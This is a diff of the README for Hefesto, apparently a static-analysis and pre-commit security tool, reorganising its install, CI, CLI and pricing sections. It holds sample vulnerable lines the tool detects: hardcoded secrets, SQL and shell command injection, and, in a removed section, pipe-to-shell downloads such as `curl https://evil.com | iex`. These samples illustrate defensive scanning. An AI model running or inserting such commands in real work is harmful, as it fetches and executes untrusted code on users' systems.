@@ -1,67 +1,68 @@
 # Hefesto - AI-Powered Code Quality Guardian
 
+<p align="center">
+  <img src="assets/hefesto-demo.gif" alt="Hefesto Demo" width="700">
+</p>
+
+AI-powered pre-commit guardian. Catches security flaws, code smells, and complexity issues in 0.01s across 21 formats.
+
 [![PyPI version](https://badge.fury.io/py/hefesto-ai.svg)](https://pypi.org/project/hefesto-ai/)
 [![Python 3.10+](https://img.shields.io/badge/python-3.10+-blue.svg)](https://www.python.org/downloads/)
 [![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
 [![Languages](https://img.shields.io/badge/languages-21-green.svg)](https://github.com/artvepa80/Agents-Hefesto)
 
-> **Keywords:** pre-commit code quality, AI generated code validation, semantic drift detection, Claude Code validator, GitHub Copilot quality gate, vibe coding safety net, code quality tool, developer tools LatAm, Peru startup, hefesto-ai, HefestoAI, open source code guardian
-
-**Multi-language AI code analysis for 7 programming languages + 10 DevOps/config formats + 4 Cloud formats.**
-
-Hefesto validates your code before production using AI-powered static analysis and ML enhancement. It caught 3 critical bugs in its own v4.0.1 release through self-validation.
-
 ---
 
-## What is Hefesto?
-
-Hefesto analyzes code using AI and catches issues that traditional linters miss:
-
-| Feature | Description |
-|---------|-------------|
-| **Code Languages (7)** | Python, TypeScript, JavaScript, Java, Go, Rust, C# |
-| **DevOps/Config (10)** | Dockerfile, Jenkins/Groovy, JSON, Makefile, PowerShell, Shell, SQL, Terraform, TOML, YAML |
-| **AI Analysis** | Google Gemini for semantic code understanding |
-| **Security Scanning** | SQL injection, hardcoded secrets, command injection |
-| **Reliability Drift** | Unbounded globals, unbounded caches, session leaks, handler duplication, threads in request paths |
-| **Memory Budget Gate** | Opt-in RSS delta gate for CI (`--enable-memory-budget-gate`) |
-| **Code Smells** | Long functions, deep nesting, high complexity |
-| **Pre-Push Hooks** | Automatic validation before every git push |
-| **REST API** | 8 endpoints for CI/CD integration |
-
----
-
-## Quick Start (60 seconds)
+## Quick Start
 
 ```bash
-# 1. Install
 pip install hefesto-ai
-
-# 2. Verify
-hefesto --version  # Should show: 4.9.3
-
-# 3. Analyze
 cd your-project
-hefesto analyze . --severity HIGH
+hefesto analyze . --fail-on critical
+```
+
+---
+
+## What Hefesto Catches
+
+| Issue | Severity | Description |
+|-------|----------|-------------|
+| HARDCODED_SECRET | CRITICAL | API keys, passwords in code |
+| SQL_INJECTION_RISK | HIGH | String concatenation in queries |
+| COMMAND_INJECTION | HIGH | Unsafe shell command execution |
+| PATH_TRAVERSAL | HIGH | Unsafe file path handling |
+| UNSAFE_DESERIALIZATION | HIGH | pickle, yaml.unsafe_load |
+| HIGH_COMPLEXITY | HIGH | Cyclomatic complexity > 10 |
+| DEEP_NESTING | HIGH | Nesting depth > 4 levels |
+| GOD_CLASS | HIGH | Classes > 500 lines |
+| LONG_FUNCTION | MEDIUM | Functions > 50 lines |
+| LONG_PARAMETER_LIST | MEDIUM | Functions with > 5 parameters |
+
+```python
+# Hefesto catches:
+password = "admin123"  # HARDCODED_SECRET
+query = f"SELECT * FROM users WHERE id={id}"  # SQL_INJECTION_RISK
+os.system(f"rm {user_input}")  # COMMAND_INJECTION
+
+# Hefesto suggests:
+password = os.getenv("PASSWORD")
+cursor.execute("SELECT * FROM users WHERE id=?", (id,))
+subprocess.run(["rm", user_input], check=True)
+```
+
+---
 
 ## GitHub Action
 
-Run Hefesto directly in your CI/CD pipeline without installing Python dependencies using our Docker-based Action:
-
-````markdown
 ```yaml
 steps:
   - uses: actions/checkout@v4
   - name: Run Hefesto Guardian
-    id: hefesto
     uses: artvepa80/Agents-Hefesto@v4.9.3
     with:
       target: '.'
       fail_on: 'CRITICAL'
-      min_severity: 'MEDIUM'
-      format: 'table'
 ```
-````
 
 **Inputs**:
 
@@ -78,38 +79,6 @@ steps:
 | Output | Description |
 |--------|-------------|
 | `exit_code` | The exit code of the CLI (0=Success, 1=Error, 2=Issues Found) |
-
-
-### Example: What Hefesto Catches
-
-**PowerShell** (PS001-PS006):
-```powershell
-Invoke-Expression $userInput  # Command injection
-curl https://evil.com | iex   # Download+execute
-$password = "admin123"         # Hardcoded secret
-```
-
-**JSON** (J001-J005):
-```json
-{
-  "db_password": "prod123",  # Hardcoded secret
-  "url": "http://internal"   # Insecure HTTP
-}
-```
-
-**Makefile** (MF001-MF005):
-```makefile
-deploy:
-	curl -k https://api | sh  # TLS bypass + pipe to shell
-```
-
-**Output**:
-```
-Files analyzed: 15 | Issues: 8
-  Critical: 2  (Hardcoded secrets)
-  High: 5      (Security risks)
-  Medium: 1    (Code smells)
-```
 
 ---
 
@@ -149,7 +118,7 @@ npx @smithery/cli@latest mcp add artvepa80/hefestoai
 | Rust | TreeSitter | Full support |
 | C# | TreeSitter | Full support |
 
-### DevOps & Configuration (Ola 1 & 2)
+### DevOps & Configuration
 
 | Format | Analyzer | Rules | Status |
 |--------|----------|-------|--------|
@@ -164,7 +133,7 @@ npx @smithery/cli@latest mcp add artvepa80/hefestoai
 | **Makefile** | MF001-MF005 | 5 security rules | v4.5.0 |
 | **Groovy** | GJ001-GJ005 | 5 security rules | v4.5.0 |
 
-### Cloud Infrastructure (Ola 4)
+### Cloud Infrastructure
 
 | Format | Analyzer | Focus | Status |
 |--------|----------|-------|--------|
@@ -174,40 +143,6 @@ npx @smithery/cli@latest mcp add artvepa80/hefestoai
 | **Serverless** | ServerlessAnalyzer | Serverless Framework | v4.7.0 |
 
 **Total**: 7 code languages + 10 DevOps formats + 4 Cloud formats = **21 supported formats**
-
-### TypeScript/JavaScript Analysis (v4.3.3)
-
-- **Arrow function naming**: Infers names from `const foo = () => {}`
-- **Accurate parameter counting**: Uses AST formal_parameters, not comma counting
-- **Method detection**: Handles Express routes, callbacks, class methods
-- **Threshold visibility**: Shows `(13 lines, threshold=10)` in all messages
-
----
-
-## Features by Tier
-
-| Feature | FREE | PRO ($8/mo) | OMEGA ($19/mo) |
-|---------|------|-------------|----------------|
-| Static Analysis | Yes | Yes | Yes |
-| Security Scanning | Basic | Advanced | Advanced |
-| Pre-push Hooks | Yes | Yes | Yes |
-| 21 Language Support | Yes | Yes | Yes |
-| ML Enhancement | No | Yes | Yes |
-| REST API | No | Yes | Yes |
-| BigQuery Analytics | No | Yes | Yes |
-| IRIS Monitoring | No | No | Yes |
-| Production Correlation | No | No | Yes |
-
-- **PRO**: [Start Free Trial](https://hefestoai.narapallc.com/trial) - 14 days, no credit card
-- **OMEGA**: [Start Free Trial](https://hefestoai.narapallc.com/trial) - 14 days, no credit card
-- **Founding Members**: [40% off forever](https://hefestoai.narapallc.com/founding) (first 25 customers)
-
-### Hefesto PRO Optional Features
-
-Hefesto OSS works standalone. If Hefesto PRO is installed, OSS can optionally enable:
-Patch C API hardening for `hefesto serve`, scope gating (first-party by default), TS/JS
-symbol discovery, and safe deterministic enrichment (schema-first, masked, bounded).
-See [`docs/PRO_OPTIONAL_FEATURES.md`](docs/PRO_OPTIONAL_FEATURES.md).
 
 ---
 
@@ -231,7 +166,7 @@ export HEFESTO_LICENSE_KEY="your-key"
 
 ---
 
-## CLI Commands
+## CLI Reference (v4.9.3)
 
 ```bash
 # Analyze code
@@ -251,6 +186,26 @@ hefesto serve --port 8000
 # Telemetry Management
 hefesto telemetry status
 hefesto telemetry clear
+```
+
+### JSON Output
+```bash
+hefesto analyze . --output json          # stdout = pure JSON, banners -> stderr
+hefesto analyze . --output json 2>/dev/null | jq .  # pipe-safe
+```
+
+### Exit Codes
+
+| Code | Meaning |
+|------|---------|
+| `0`  | Analysis complete (no `--fail-on`, or threshold not breached) |
+| `1`  | Gate failure (`--fail-on` threshold breached) or runtime error |
+
+### Gate Examples
+```bash
+hefesto analyze . --fail-on high         # exit 1 if HIGH+ found
+hefesto analyze . --fail-on critical     # exit 1 only if CRITICAL found
+hefesto analyze .                        # always exit 0 (report only)
 ```
 
 ---
@@ -279,41 +234,30 @@ The hook runs two gates:
 
 ---
 
-## What Hefesto Catches
+## Features by Tier
 
-### Code Quality
+| Feature | FREE | PRO ($8/mo) | OMEGA ($19/mo) |
+|---------|------|-------------|----------------|
+| Static Analysis | Yes | Yes | Yes |
+| Security Scanning | Basic | Advanced | Advanced |
+| Pre-push Hooks | Yes | Yes | Yes |
+| 21 Language Support | Yes | Yes | Yes |
+| ML Enhancement | No | Yes | Yes |
+| REST API | No | Yes | Yes |
+| BigQuery Analytics | No | Yes | Yes |
+| IRIS Monitoring | No | No | Yes |
+| Production Correlation | No | No | Yes |
 
-| Issue | Severity | Description |
-|-------|----------|-------------|
-| LONG_FUNCTION | MEDIUM | Functions > 50 lines |
-| HIGH_COMPLEXITY | HIGH | Cyclomatic complexity > 10 |
-| DEEP_NESTING | HIGH | Nesting depth > 4 levels |
-| LONG_PARAMETER_LIST | MEDIUM | Functions with > 5 parameters |
-| GOD_CLASS | HIGH | Classes > 500 lines |
+- **PRO**: [Start Free Trial](https://hefestoai.narapallc.com/trial) - 14 days, no credit card
+- **OMEGA**: [Start Free Trial](https://hefestoai.narapallc.com/trial) - 14 days, no credit card
+- **Founding Members**: [40% off forever](https://hefestoai.narapallc.com/founding) (first 25 customers)
 
-### Security
+### Hefesto PRO Optional Features
 
-| Issue | Severity | Description |
-|-------|----------|-------------|
-| HARDCODED_SECRET | CRITICAL | API keys, passwords in code |
-| SQL_INJECTION_RISK | HIGH | String concatenation in queries |
-| COMMAND_INJECTION | HIGH | Unsafe shell command execution |
-| PATH_TRAVERSAL | HIGH | Unsafe file path handling |
-| UNSAFE_DESERIALIZATION | HIGH | pickle, yaml.unsafe_load |
-
-### Example Fixes
-
-```python
-# Hefesto catches:
-password = "admin123"  # HARDCODED_SECRET
-query = f"SELECT * FROM users WHERE id={id}"  # SQL_INJECTION_RISK
-os.system(f"rm {user_input}")  # COMMAND_INJECTION
-
-# Hefesto suggests:
-password = os.getenv("PASSWORD")
-cursor.execute("SELECT * FROM users WHERE id=?", (id,))
-subprocess.run(["rm", user_input], check=True)
-```
+Hefesto OSS works standalone. If Hefesto PRO is installed, OSS can optionally enable:
+Patch C API hardening for `hefesto serve`, scope gating (first-party by default), TS/JS
+symbol discovery, and safe deterministic enrichment (schema-first, masked, bounded).
+See [`docs/PRO_OPTIONAL_FEATURES.md`](docs/PRO_OPTIONAL_FEATURES.md).
 
 ---
 
@@ -387,8 +331,6 @@ jobs:
       - name: Run Analysis
         run: hefesto analyze . --severity HIGH
 ```
-
-
 
 ### GitLab CI
 
@@ -553,27 +495,7 @@ We used Hefesto to validate itself before publishing v4.0.1:
 
 ---
 
-
-## CLI Reference (v4.9.3)
-
-### JSON Output
-```bash
-hefesto analyze . --output json          # stdout = pure JSON, banners -> stderr
-hefesto analyze . --output json 2>/dev/null | jq .  # pipe-safe
-```
-
-### Exit Codes
-| Code | Meaning |
-|------|---------|
-| `0`  | Analysis complete (no `--fail-on`, or threshold not breached) |
-| `1`  | Gate failure (`--fail-on` threshold breached) or runtime error |
-
-### Gate Examples
-```bash
-hefesto analyze . --fail-on high         # exit 1 if HIGH+ found
-hefesto analyze . --fail-on critical     # exit 1 only if CRITICAL found
-hefesto analyze .                        # always exit 0 (report only)
-```
+> **Keywords:** pre-commit code quality, AI generated code validation, semantic drift detection, Claude Code validator, GitHub Copilot quality gate, vibe coding safety net, code quality tool, developer tools LatAm, Peru startup, hefesto-ai, HefestoAI, open source code guardian
 
 ## License
 
